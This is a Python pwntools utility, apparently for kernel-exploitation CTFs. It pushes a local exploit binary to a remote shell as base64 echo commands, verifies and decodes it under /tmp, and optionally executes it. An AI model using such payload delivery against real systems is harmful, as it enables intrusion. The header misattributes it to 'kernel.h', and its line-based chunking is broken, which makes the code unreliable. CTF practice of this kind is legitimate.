# 本脚本原作者：
#/**
# * @file kernel.h
# * @author arttnba3 (arttnba@gmail.com)
# * @brief arttnba3's personal utils for kernel pwn
# * @version 1.1
# * @date 2023-05-20
# *
# * @copyright Copyright (c) 2023 arttnba3
# *
# */


#/**
 #* @modification Modified by Cyber_Kaiyo (tgychine@foxmail.com)
 #* @date 2025-07-01
 #* @brief 做了翻译，以及一些改造
 #*/

#!/bin/python3

from pwn import *
import base64
import hashlib
import argparse
import time
from tqdm import tqdm  # pip install tqdm

# -----------------------------
# 参数解析
# -----------------------------
parser = argparse.ArgumentParser(description="通过Shell上传exp（分段+base64+校验+进度）")
parser.add_argument("ip", help="目标IP")
parser.add_argument("port", type=int, help="目标端口")
parser.add_argument("exp_path", help="本地exp路径")
parser.add_argument("--remote_prefix", default="/tmp/temp", help="远程分段文件前缀")
parser.add_argument("--chunk_size", type=int,
                    default=800, help="base64分片大小（行数）")
parser.add_argument("--final_path", default="/tmp/exp", help="最终解码后文件路径")
parser.add_argument("--exec", action="store_true", help="上传后自动执行")
args = parser.parse_args()

# -----------------------------
# 文件读取与编码
# -----------------------------


def prepare_base64(filepath):
    with open(filepath, 'rb') as f:
        raw = f.read()
    encoded = base64.b64encode(raw).decode()
    sha256sum = hashlib.sha256(encoded.encode()).hexdigest()
    return encoded, sha256sum


def split_b64_chunks(encoded_data, chunk_size):
    lines = encoded_data.splitlines()
    return [lines[i:i+chunk_size] for i in range(0, len(lines), chunk_size)]

# -----------------------------
# 上传主逻辑
# -----------------------------


def upload_exp():
    encoded, sha256_local = prepare_base64(args.exp_path)
    chunks = split_b64_chunks(encoded, args.chunk_size)

    log.info(f"本地 base64 编码 SHA256: {sha256_local}")
    conn = remote(args.ip, args.port)
    conn.recv(timeout=1)

    # 清理可能存在的旧文件
    conn.send(
        f"rm -f {args.remote_prefix}* {args.final_path}.b64 {args.final_path}\n".encode())
    time.sleep(0.3)

    # 上传每一段，带进度条
    with tqdm(total=len(chunks), desc="上传进度", ncols=80) as bar:
        for idx, lines in enumerate(chunks):
            remote_file = f"{args.remote_prefix}{idx+1}"
            for line in lines:
                safe_line = line.replace("'", "'\\''")  # 防止引号破坏命令
                cmd = f"echo '{safe_line}' >> {remote_file}\n"
                conn.send(cmd.encode())
                time.sleep(0.002)  # 防止粘包
            bar.update(1)

    # 合并、计算远程 SHA256
    sha256_check_cmd = (
        f"cat {args.remote_prefix}* > {args.final_path}.b64 && "
        f"sha256sum {args.final_path}.b64 | awk '{{print $1}}'\n"
    )
    log.info("合并并计算远程SHA256...")
    conn.send(sha256_check_cmd.encode())
    remote_sha256 = conn.recvline(timeout=2).strip().decode()

    log.info(f"远程 base64 文件 SHA256: {remote_sha256}")
    if remote_sha256 != sha256_local:
        log.error("❌ SHA256 校验失败，传输内容可能损坏！")
        conn.close()
        return

    log.success("✅ SHA256 校验成功，正在解码生成最终可执行文件")

    # 解码 & 授权
    decode_cmd = (
        f"base64 -d {args.final_path}.b64 > {args.final_path} && chmod +x {args.final_path}\n"
    )
    conn.send(decode_cmd.encode())
    time.sleep(0.3)

    # 执行或保持连接
    if args.exec:
        log.info(f"执行远程 payload: {args.final_path}")
        conn.send(f"{args.final_path}\n".encode())

    conn.interactive()


# -----------------------------
# 主函数入口
# -----------------------------
if __name__ == "__main__":
    upload_exp()

